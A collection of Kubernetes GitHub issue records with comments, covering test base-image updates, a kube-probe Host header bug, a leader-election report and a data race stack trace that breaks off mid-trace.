{"repo": "kubernetes/kubernetes", "issue_number": 131874, "issue_url": "https://github.com/kubernetes/kubernetes/issues/131874", "issue_title": "Update the BASEIMAGEs to the latest version for test/images", "issue_author": "mkumatag", "issue_body": "Some test images are still referencing outdated versions, such as alpine:3.6 and alpine:3.8, which are no longer supported. This task involves updating all such images to the latest available versions.\n\nTest Image - Current Base Image Version\n\n- [x] agnhost - alpine:3.6 - https://github.com/kubernetes/kubernetes/pull/131879, https://github.com/kubernetes/k8s.io/pull/8122\nhttps://github.com/kubernetes/kubernetes/blob/6da56bd4b782658a4060f65c24df5830ec01c6c1/test/images/agnhost/Dockerfile_windows#L20\n>Note: Although it is used during the intermediate stage, it is always better to point to the latest available image.\n- [x] apparmor-loader - alpine:3.14 - https://github.com/kubernetes/kubernetes/pull/132242 https://github.com/kubernetes/k8s.io/pull/8185\n- [x] httpd - httpd:2.4.38-alpine - https://github.com/kubernetes/kubernetes/pull/132655\n- [x] httpd-new - httpd:2.4.39-alpine - https://github.com/kubernetes/kubernetes/pull/132655\n- [x] ipc-utils - alpine:3.6 - \n- [ ] jessie-dnsutils - debian:jessie\n- [x] kitten - agnhost:2.33* - https://github.com/kubernetes/kubernetes/pull/133818\n- [x] nautilus - agnhost:2.33* - https://github.com/kubernetes/kubernetes/pull/133840\n- [x] nginx - nginx:1.14-alpine - https://github.com/kubernetes/kubernetes/pull/132442\n- [x] nginx-new - nginx:1.15-alpine - https://github.com/kubernetes/kubernetes/pull/132442\n- [ ] node-perf/npb-ep - debian:stretch-slim\n- [ ] node-perf/npb-is - debian:stretch-slim\n- [ ] node-perf/tf-wide-deep - python:3.6-slim-stretch\n- [x] nonewprivs - alpine:3.6 - https://github.com/kubernetes/kubernetes/pull/132260\n- [x] perl - perl:5.26 - https://github.com/kubernetes/kubernetes/pull/132249\n- [x] redis - alpine:3.6 - https://github.com/kubernetes/kubernetes/pull/132756\n- [x] simple-apiserver - alpine:3.8, k8s 0.32.1 - https://github.com/kubernetes/kubernetes/pull/132814\n- [x] sample-device-plugin - alpine:3.8 - https://github.com/kubernetes/kubernetes/pull/133075\n- [x] volume/iscsi - fedora:38 - https://github.com/kubernetes/kubernetes/pull/133800\n- [x] volume/nfs - centos:7 - https://github.com/kubernetes/kubernetes/pull/133799\n- [x] volume/rbd - fedora:38 - https://github.com/kubernetes/kubernetes/pull/133620\n- [ ] windows/powershell-helper - mcr.microsoft.com/windows/nanoserver:1809, mcr.microsoft.com/windows/servercore:ltsc2019 - https://github.com/kubernetes/kubernetes/pull/133859\n- [ ] windows-nanoserver - mcr.microsoft.com/windows/nanoserver:1809, mcr.microsoft.com/windows/nanoserver:ltsc2022 - https://github.com/kubernetes/kubernetes/pull/133860", "issue_labels": ["help wanted", "sig/testing", "good first issue", "triage/accepted"], "comments": [{"author": "mkumatag", "body": "/sig testing\n/triage accepted"}, {"author": "mkumatag", "body": "/assign"}, {"author": "aojea", "body": "how many of these images we can remove?\n\nnode-perf/tf-wide-deep does not seems to be used anywhere"}, {"author": "mkumatag", "body": "> how many of these images we can remove?\n\nGood question, I need to assess that and remove some of these if not required anymore :)"}, {"author": "aojea", "body": "I didn't mean to impose, but since you are doing it that will be great"}, {"author": "mkumatag", "body": "> I didn't mean to impose, but since you are doing it that will be great\n\nOh, no worries at all - it's really no imposition. We should just get rid of all the unused images."}, {"author": "kishen-v", "body": "/cc"}, {"author": "BenTheElder", "body": "We are definitely trying to remove these where possible but +1 to update in the meantime.\n\nPlease note where possible if these can be replaced by agnhost or why not when looking at them if you can, we have a linter that checks that we don't add more e2e images to maintain. (In part because it's hard to keep them all up to date, but also because it makes airgapped / mirrored testing harder, etc)"}, {"author": "mkumatag", "body": "> Please note where possible if these can be replaced by agnhost or why not when looking at them if you can, we have a linter that checks that we don't add more e2e images to maintain.\n\nThis isn\u2019t going to be straightforward, so I\u2019ll create a separate issue to track the work. I\u2019m not sure if there\u2019s any existing code we can refer to for linting. Honestly, I haven\u2019t seen any new code added here in a while, so if someone tries to add more images, we can just nack it manually. If needed, we can also add instructions to the README."}, {"author": "BenTheElder", "body": "> This isn\u2019t going to be straightforward, so I\u2019ll create a separate issue to track the work. I\u2019m not sure if there\u2019s any existing code we can refer to for linting\n\nEr, We already implemented this check to prevent adding new images.\n\nFor removing images, we've had a few tracking issues over the years.\n\nThey'll need different solutions, but often when inspecting one of these I've found it doesn't do much, has few uses, and is readily replaced.\n\nJust something to chip away at opportunistically to make this problem more maintainable."}, {"author": "mkumatag", "body": "/reopen"}, {"author": "k8s-ci-robot", "body": "@mkumatag: Reopened this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/131874#issuecomment-2965838233):\n\n>/reopen\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "TinaMor", "body": "@mkumatag I have a PR open for jessie-dnsutils. I have updated the Debian version to Bookworm from Jessie. Please let me know if I should keep the PR open\n\n[Upgrade jessie-dnsutils Debian base image from Jessie to Bookworm #132273](https://github.com/kubernetes/kubernetes/pull/132273)"}, {"author": "ylink-lfs", "body": "/assign "}, {"author": "ylink-lfs", "body": "I have investigated the `httpd` test image usage. Should we migrate the `httpd` image to `agnhost`? The `agnhost` image already provided net-related functionalities to test http connectivity. \ncc @mkumatag "}, {"author": "mkumatag", "body": "> I have investigated the `httpd` test image usage. Should we migrate the `httpd` image to `agnhost`? The `agnhost` image already provided net-related functionalities to test http connectivity.\n\ndefinitely if that works.!"}, {"author": "ylink-lfs", "body": "> node-perf/tf-wide-deep does not seems to be used anywhere\n\n`node-perf/tf-wide-deep` seems still referenced as the depedency of node component stress test, which can be found below:\n- https://github.com/kubernetes/kubernetes/blob/beb3d92ee0e655f85fdb1204828b94ee69a0408a/test/e2e_node/perf/workloads/tf_wide_deep.go#L47"}, {"author": "mkumatag", "body": "\n> * [kubernetes/test/e2e_node/perf/workloads/tf_wide_deep.go](https://github.com/kubernetes/kubernetes/blob/beb3d92ee0e655f85fdb1204828b94ee69a0408a/test/e2e_node/perf/workloads/tf_wide_deep.go#L47)\n>       \n>       \n>            Line 47\n>         in\n>         [beb3d92](/kubernetes/kubernetes/commit/beb3d92ee0e655f85fdb1204828b94ee69a0408a)\n\n\nWe need to check with the sig-node team to see if this test is still relevant. It would be okay to remove it if they confirm that it's no longer necessary."}, {"author": "aman4433", "body": "Hi, I noticed that `sample-device-plugin` is still on Alpine 3.8 and went ahead and raised a PR to update it to Alpine 3.22. Please let me know if this is within the scope of this issue \u2014 open to revising if needed.\n"}, {"author": "ylink-lfs", "body": "Kindly remind that the issue description may need some update. @mkumatag\nBtw, noticed there's a stale PR https://github.com/kubernetes/kubernetes/pull/132261 for windows image update. Maybe subsequent PRs for windows platform image update could reference that."}, {"author": "ylink-lfs", "body": "/good-first-issue\n/help\n\nTo newcomers: a simple version update is fine, while a deeper investigation into the possibility of removing redundant test images would be highly valuable.\n\nReference material: https://github.com/kubernetes/community/blob/master/contributors/devel/sig-testing/e2e-tests.md"}, {"author": "k8s-ci-robot", "body": "@ylink-lfs: \n\tThis request has been marked as suitable for new contributors.\n\n### Guidelines\nPlease ensure that the issue body includes answers to the following questions:\n- Why are we solving this issue?\n- To address this issue, are there any code changes? If there are code changes, what needs to be done in the code and what places can the assignee treat as reference points?\n- How can the assignee reach out to you for help?\n\n\nFor more details on the requirements of such an issue, please see [here](https://www.kubernetes.dev/docs/guide/help-wanted/#good-first-issue) and ensure that they are met.\n\nIf this request no longer meets these requirements, the label can be removed\nby commenting with the `/remove-good-first-issue` command.\n\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/131874):\n\n>/good-first-issue\n>/help\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "brandonrjacobs", "body": "I PR'd an update to`httpd` here https://github.com/kubernetes/kubernetes/pull/133487 let me know if we require anything different. "}, {"author": "pacoxu", "body": "> * httpd - httpd:2.4.38-alpine - [Update base image for httpd and httpd-new images\u00a0#131888](https://github.com/kubernetes/kubernetes/pull/131888)[ ]  httpd-new - httpd:2.4.39-alpine - [Update base image for httpd and httpd-new images\u00a0#131888](https://github.com/kubernetes/kubernetes/pull/131888)\n\n@mkumatag would you remove httpd in the issue description here as httpd image is handled by another removal PR: https://github.com/kubernetes/kubernetes/pull/132655"}, {"author": "ylink-lfs", "body": "/reopen"}, {"author": "k8s-ci-robot", "body": "@ylink-lfs: Reopened this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/131874#issuecomment-3260366659):\n\n>/reopen\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "jmdeveloper57", "body": "/assign"}, {"author": "ylink-lfs", "body": "/reopen"}, {"author": "k8s-ci-robot", "body": "@ylink-lfs: Reopened this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/131874#issuecomment-3288130167):\n\n>/reopen\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "vyual", "body": "/assign\n\n"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 134170, "issue_url": "https://github.com/kubernetes/kubernetes/issues/134170", "issue_title": "kube-probe Host header is not RFC compliant by default", "issue_author": "xeron", "issue_body": "### What happened?\n\nWhen kube-probe does a request based on the probe configured without `httpHeaders` set it sends `Host` header as a port  only, without hostname, which is not RFC-compliant.\n\nExample:\n```\nGET /healthcheck HTTP/1.1\nHost: :8283\nUser-Agent: kube-probe/1.30\nAccept: */*\nConnection: close\n```\n\n### What did you expect to happen?\n\nWe expect `Host` header to have hostname set to Pod IP, as Pod IP is used by default when probe URL is generated.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\n```\n    readinessProbe:\n      httpGet:\n        path: /healthcheck\n        port: 8283\n```\n\n### Anything else we need to know?\n\nI think the problem comes from [this code](https://github.com/kubernetes/kubernetes/blob/243d8c000e451da6f0e8f80704db5d5f672d3d18/pkg/probe/http/request.go#L63-L87).\n\nWhen headers are `nil` it generates new empty hash, sets some default values, but then does:\n\n```go\n\treq.Header = headers\n\treq.Host = headers.Get(\"Host\")\n```\n\nSo even if `req.Host` was previously set (I assume by `http.NewRequest`) it will be empty because `headers` doesn't have `\"Host\"` key by default.\n\n### Kubernetes version\n\n<details>\n\n```console\n# kubelet --version\nKubernetes v1.30.14\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\nAWS\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# cat /etc/os-release\nNAME=\"Amazon Linux\"\nVERSION=\"2023\"\nID=\"amzn\"\nID_LIKE=\"fedora\"\nVERSION_ID=\"2023\"\nPLATFORM_ID=\"platform:al2023\"\nPRETTY_NAME=\"Amazon Linux 2023.8.20250818\"\nANSI_COLOR=\"0;33\"\nCPE_NAME=\"cpe:2.3:o:amazon:amazon_linux:2023\"\nHOME_URL=\"https://aws.amazon.com/linux/amazon-linux-2023/\"\nDOCUMENTATION_URL=\"https://docs.aws.amazon.com/linux/\"\nSUPPORT_URL=\"https://aws.amazon.com/premiumsupport/\"\nBUG_REPORT_URL=\"https://github.com/amazonlinux/amazon-linux-2023\"\nVENDOR_NAME=\"AWS\"\nVENDOR_URL=\"https://aws.amazon.com/\"\nSUPPORT_END=\"2029-06-30\"\n# uname -a\nLinux [REDACTED] 6.1.147-172.266.amzn2023.x86_64 #1 SMP PREEMPT_DYNAMIC Thu Aug  7 19:30:40 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "sig/node", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "lmktfy", "body": "/sig node"}, {"author": "haircommander", "body": "/cc"}, {"author": "haircommander", "body": "this is a golang decision:\n```\n\t// For incoming requests, the Host header is promoted to the\n\t// Request.Host field and removed from the Header map.\n```\nfrom https://pkg.go.dev/net/http\n\nI was able to reproduce in a unit test, but golang always stripped it out. There's nothing k8s can do\n/close"}, {"author": "k8s-ci-robot", "body": "@haircommander: Closing this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/134170#issuecomment-3348930312):\n\n>this is a golang decision:\n>```\n>\t// For incoming requests, the Host header is promoted to the\n>\t// Request.Host field and removed from the Header map.\n>```\n>from https://pkg.go.dev/net/http\n>\n>I was able to reproduce in a unit test, but golang always stripped it out. There's nothing k8s can do\n>/close\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "xeron", "body": "@haircommander I'm not a go developer but described http library behavior has nothing to do with this line in k8s code:\n\n```go\nreq.Host = headers.Get(\"Host\")\n```\n\nI can imagine the solution could be as simple as \"Don't overwrite `req.Host` if `headers` doesn't have `Host` key\". Or \"Set `Host` header to `podIP` if empty\".\n\nCould you please take a look more closely?\n\nUpdate:\n\nI experimented with go http library locally and the only way I can reproduce this behavior is when both `host` and `podIP` are empty. In all other situations go actually sets correct `Host` header on wire (reading with netcat).\n\nI'd assume `podIP` might be empty when using `hostNetwork: true`."}, {"author": "aojea", "body": "> I'd assume `podIP` might be empty when using `hostNetwork: true`.\n\nhostNetwork pods get PodIPs too\n\n\n\n> When headers are `nil` it generates new empty hash, sets some default values, but then does:\n> \n> \treq.Header = headers\n> \treq.Host = headers.Get(\"Host\")\n\nIIUIC the Host header is handled directly by golang and not retrieved from the Headers map https://cs.opensource.google/go/go/+/refs/tags/go1.25.1:src/net/http/request.go;l=98-105;drc=b2819d13dbe19343426e688da4ddfeb57c8589fc\n\n\nIt will important to have a reproducer to better understand this report"}, {"author": "xeron", "body": "I provided a reproducer in original report and haircommander said they were able to reproduce it in unit test.\n\nI can post a bit more expanded version with `hostNetwork` too I guess. This is simplified yaml from our real host which runs standalone `kubelet`:\n\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: role-pod\nspec:\n  hostNetwork: true\n  containers:\n    - name: role-container\n      image: role-image\n      readinessProbe:\n        httpGet:\n          path: /healthcheck\n          port: 8283\n```\n\nAnd from my local go code experiments (based on the code from kubernetes http probe) this issue happens only when both `host` and `podIP` are `\"\"`.\n\nI've also tried upgrading kubelet to 1.34.1 but the issue persists:\n\n```\nGET /healthcheck HTTP/1.1\nHost: :8283\nUser-Agent: kube-probe/1.34\nAccept: */*\nConnection: close\n```\n\nI tried inspecting pod ip by adding env var:\n\n```yaml\n        - name: MY_POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n```\nand it's empty:\n```\n$ echo $MY_POD_IP\n\n$\n```\n\nUsing kubelet API:\n\n```\n# curl http://localhost:10255/pods | jq '.items[].status.podIP'\nnull\n```"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 131621, "issue_url": "https://github.com/kubernetes/kubernetes/issues/131621", "issue_title": "The network between kube-controller-manager and apiserver is abnormal, but the master node is not selected.", "issue_author": "Black-max12138", "issue_body": "### What happened?\n\nAccording to the kube-controller-manager log, the controller-manager fails to connect to the API server due to certain reasons. However, there is no log indicating that the master node fails to be selected, but only the log indicating that the watch request is disconnected. The configuration is leader-elect-lease-duration=20s. leader-elect-renew-deadline=15s\n\n### What did you expect to happen?\n\nIf the renewal-deadline time expires, the primary selection fails and the system is not suspended.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nN/A\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\n# paste output here\n```\n1.31\n</details>\n\n\n### Cloud provider\n\n<details>\n\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "needs-sig", "lifecycle/rotten", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "There are no sig labels on this issue. Please add an appropriate label by using one of the following commands:\n- `/sig <group-name>`\n- `/wg <group-name>`\n- `/committee <group-name>`\n\nPlease see the [group list](https://git.k8s.io/community/sig-list.md) for a listing of the SIGs, working groups, and committees available.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "aojea", "body": "I assume this controller manager was never leader, otherwise it should have exited\n\nhttps://github.com/kubernetes/kubernetes/blob/288b044e0f3617c7ec3c832edf925bfe7014e392/cmd/kube-controller-manager/app/controllermanager.go#L340-L343\n\n> the primary selection fails and the system is not suspended.\n\nwhat do you mean by primary?"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Reopen this issue with `/reopen`\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/close not-planned\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-ci-robot", "body": "@k8s-triage-robot: Closing this issue, marking it as \"Not Planned\".\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/131621#issuecomment-3366171132):\n\n>The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n>\n>This bot triages issues according to the following rules:\n>- After 90d of inactivity, `lifecycle/stale` is applied\n>- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n>- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n>\n>You can:\n>- Reopen this issue with `/reopen`\n>- Mark this issue as fresh with `/remove-lifecycle rotten`\n>- Offer to help out with [Issue Triage][1]\n>\n>Please send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n>\n>/close not-planned\n>\n>[1]: https://www.kubernetes.dev/docs/guide/issue-triage/\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 134372, "issue_url": "https://github.com/kubernetes/kubernetes/issues/134372", "issue_title": "DATA RACE: metrics initialization in API server", "issue_author": "pohly", "issue_body": "### What happened?\n\n#### kube-system/kube-apiserver-kind-control-plane\n\nDATA RACE:\n\n    Write at 0x00c000690f51 by main goroutine:\n      k8s.io/component-base/metrics.(*lazyMetric).preprocessMetric.func1()\n          k8s.io/component-base/metrics/metric.go:124 +0x2a4\n      sync.(*Once).doSlow()\n          sync/once.go:78 +0xd1\n      sync.(*Once).Do()\n          sync/once.go:69 +0x44\n      k8s.io/component-base/metrics.(*lazyMetric).preprocessMetric()\n          k8s.io/component-base/metrics/metric.go:114 +0x1a6\n      k8s.io/component-base/metrics.(*lazyMetric).Create()\n          k8s.io/component-base/metrics/metric.go:144 +0xe4\n      k8s.io/component-base/metrics.(*kubeRegistry).MustRegister()\n          k8s.io/component-base/metrics/registry.go:258 +0xee\n      k8s.io/component-base/metrics.KubeRegistry.MustRegister-fm()\n          <autogenerated>:1 +0x67\n      k8s.io/apiserver/pkg/server/routes.register.Register.func3()\n          k8s.io/apiserver/pkg/storage/etcd3/metrics/metrics.go:191 +0x434\n      sync.(*Once).doSlow()\n          sync/once.go:78 +0xd1\n      sync.(*Once).Do()\n          sync/once.go:69 +0x44\n      k8s.io/apiserver/pkg/storage/etcd3/metrics.Register()\n          k8s.io/apiserver/pkg/storage/etcd3/metrics/metrics.go:184 +0x58\n      k8s.io/apiserver/pkg/server/routes.register()\n          k8s.io/apiserver/pkg/server/routes/metrics.go:53 +0x45\n      k8s.io/apiserver/pkg/server/routes.MetricsWithReset.Install()\n          k8s.io/apiserver/pkg/server/routes/metrics.go:45 +0x24\n      k8s.io/apiserver/pkg/server.installAPI()\n          k8s.io/apiserver/pkg/server/config.go:1115 +0x3c4\n      k8s.io/apiserver/pkg/server.completedConfig.New()\n          k8s.io/apiserver/pkg/server/config.go:994 +0x3284\n      k8s.io/apiextensions-apiserver/pkg/apiserver.completedConfig.New()\n          k8s.io/apiextensions-apiserver/pkg/apiserver/apiserver.go:128 +0xa4\n      k8s.io/kubernetes/cmd/kube-apiserver/app.CreateServerChain()\n          k8s.io/kubernetes/cmd/kube-apiserver/app/server.go:178 +0x1f0\n      k8s.io/kubernetes/cmd/kube-apiserver/app.Run()\n          k8s.io/kubernetes/cmd/kube-apiserver/app/server.go:162 +0x4a4\n      k8s.io/kubernetes/cmd/kube-apiserver/app.Run()\n          k8s.io/kubernetes/cmd/kube-apiserver/app/server.go:158 +0x492\n      k8s.io/kubernetes/pkg/controlplane/apiserver.CreateConfig()\n          k8s.io/kubernetes/pkg/controlplane/apiserver/config.go:320 +0x866\n      k8s.io/kubernetes/cmd/kube-apiserver/app.CreateKubeAPIServerConfig()\n          k8s.io/kubernetes/cmd/kube-apiserver/app/server.go:225 +0x2e4\n      k8s.io/kubernetes/cmd/kube-apiserver/app.NewConfig()\n          k8s.io/kubernetes/cmd/kube-apiserver/app/config.go:89 +0x1f5\n      k8s.io/kubernetes/cmd/kube-apiserver/app.Run()\n          k8s.io/kubernetes/cmd/kube-apiserver/app/server.go:154 +0x484\n      k8s.io/kubernetes/cmd/kube-apiserver/app.NewAPIServerCommand.func2()\n          k8s.io/kubernetes/cmd/kube-apiserver/app/server.go:117 +0x25b\n      github.com/spf13/cobra.(*Command).execute()\n          github.com/spf13/cobra@v1.10.0/command.go:1015 +0x113b\n      github.com/spf13/cobra.(*Command).ExecuteC()\n          github.com/spf13/cobra@v1.10.0/command.go:1148 +0x797\n      github.com/spf13/cobra.(*Command).Execute()\n          github.com/spf13/cobra@v1.10.0/command.go:1071 +0x4d0\n      k8s.io/component-base/cli.run()\n          k8s.io/component-base/cli/run.go:146 +0x4d1\n      k8s.io/component-base/cli.Run()\n          k8s.io/component-base/cli/run.go:44 +0x3b\n      main.main()\n          k8s.io/kubernetes/cmd/kube-apiserver/apiserver.go:34 +0x24\n    \n    Previous read at 0x00c000690f51 by goroutine 243:\n      k8s.io/component-base/metrics.(*lazyMetric).IsHidden()\n          k8s.io/component-base/metrics/metric.go:130 +0x244\n      k8s.io/component-base/metrics.(*GaugeVec).WithLabelValuesChecked()\n          k8s.io/component-base/metrics/gauge.go:141 +0x251\n      k8s.io/component-base/metrics.(*GaugeVec).WithLabelValues()\n          k8s.io/component-base/metrics/gauge.go:180 +0x48\n      k8s.io/apiserver/pkg/storage/etcd3/metrics.UpdateEtcdDbSize()\n          k8s.io/apiserver/pkg/storage/etcd3/metrics/metrics.go:274 +0x73\n      k8s.io/apiserver/pkg/storage/storagebackend/factory.startDBSizeMonitorPerEndpoint.func2()\n          k8s.io/apiserver/pkg/storage/storagebackend/factory/etcd3.go:510 +0x285\n      go.etcd.io/etcd/client/v3.(*maintenance).Status()\n          go.etcd.io/etcd/client/v3@v3.6.4/maintenance.go:210 +0x159\n      k8s.io/apiserver/pkg/storage/storagebackend/factory.startDBSizeMonitorPerEndpoint.func2()\n          k8s.io/apiserver/pkg/storage/storagebackend/factory/etcd3.go:505 +0xa2\n      k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext.func1()\n          k8s.io/apimachinery/pkg/util/wait/backoff.go:255 +0x98\n      k8s.io/apimachinery/pkg/util/wait.BackoffUntilWithContext()\n          k8s.io/apimachinery/pkg/util/wait/backoff.go:256 +0xed\n      k8s.io/apimachinery/pkg/util/wait.JitterUntilWithContext()\n          k8s.io/apimachinery/pkg/util/wait/backoff.go:223 +0x108\n      k8s.io/apiserver/pkg/storage/storagebackend/factory.startDBSizeMonitorPerEndpoint.gowrap2()\n          k8s.io/apiserver/pkg/storage/storagebackend/factory/etcd3.go:504 +0x6a\n    \n    Goroutine 243 (running) created at:\n      k8s.io/apiserver/pkg/storage/storagebackend/factory.startDBSizeMonitorPerEndpoint()\n          k8s.io/apiserver/pkg/storage/storagebackend/factory/etcd3.go:504 +0x5fd\n      k8s.io/apiserver/pkg/storage/storagebackend/factory.newETCD3Storage()\n          k8s.io/apiserver/pkg/storage/storagebackend/factory/etcd3.go:441 +0x25c\n      k8s.io/apiserver/pkg/storage/storagebackend/factory.Create()\n          k8s.io/apiserver/pkg/storage/storagebackend/factory/factory.go:38 +0x198\n      k8s.io/apiserver/pkg/reconcilers.NewPeerEndpointLeaseReconciler()\n          k8s.io/apiserver/pkg/reconcilers/peer_endpoint_lease.go:83 +0xcc\n      k8s.io/kubernetes/pkg/controlplane/apiserver.CreatePeerEndpointLeaseReconciler()\n          k8s.io/kubernetes/pkg/controlplane/apiserver/peer.go:91 +0x264\n      k8s.io/kubernetes/pkg/controlplane/apiserver.CreateConfig()\n          k8s.io/kubernetes/pkg/controlplane/apiserver/config.go:320 +0x866\n      k8s.io/kubernetes/cmd/kube-apiserver/app.CreateKubeAPIServerConfig()\n          k8s.io/kubernetes/cmd/kube-apiserver/app/server.go:225 +0x2e4\n      k8s.io/kubernetes/cmd/kube-apiserver/app.NewConfig()\n          k8s.io/kubernetes/cmd/kube-apiserver/app/config.go:89 +0x1f5\n      k8s.io/kubernetes/cmd/kube-apiserver/app.Run()\n          k8s.io/kubernetes/cmd/kube-apiserver/app/server.go:154 +0x484\n      k8s.io/kubernetes/cmd/kube-apiserver/app.NewAPIServerCommand.func2()\n          k8s.io/kubernetes/cmd/kube-apiserver/app/server.go:117 +0x25b\n      github.com/spf13/cobra.(*Command).execute()\n          github.com/spf13/cobra@v1.10.0/command.go:1015 +0x113b\n      